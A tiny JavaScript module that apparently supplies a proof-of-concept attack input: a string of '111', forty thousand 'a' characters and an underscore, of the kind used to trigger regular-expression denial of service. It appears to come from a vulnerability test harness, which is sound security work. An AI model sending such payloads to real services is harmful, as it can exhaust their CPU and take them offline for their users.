function getPayload() {
    function build_attack(n) {
        var ret = "111";
        for (var i = 0; i < n; i++) {
            ret += "a";
        }
        return ret + "_";
    }

    var attack_str = build_attack(40004);
    return { payload: attack_str };
}

module.exports = { getPayload };